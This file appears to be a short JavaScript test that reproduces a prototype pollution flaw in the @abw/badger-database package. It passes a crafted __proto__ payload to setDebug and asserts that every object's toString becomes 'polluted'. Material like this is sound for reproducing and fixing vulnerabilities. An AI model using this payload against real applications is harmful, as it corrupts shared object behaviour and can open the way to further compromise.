test("Prototype pollution in @abw/badger-database", () => {
  const { setDebug }= require("@abw/badger-database");

  let payload = { ["__proto__"]: { "toString": "polluted" } };

  expect({}.toString).toBe({}.toString);

  setDebug(payload);

  expect({}.toString).toBe("polluted");
});
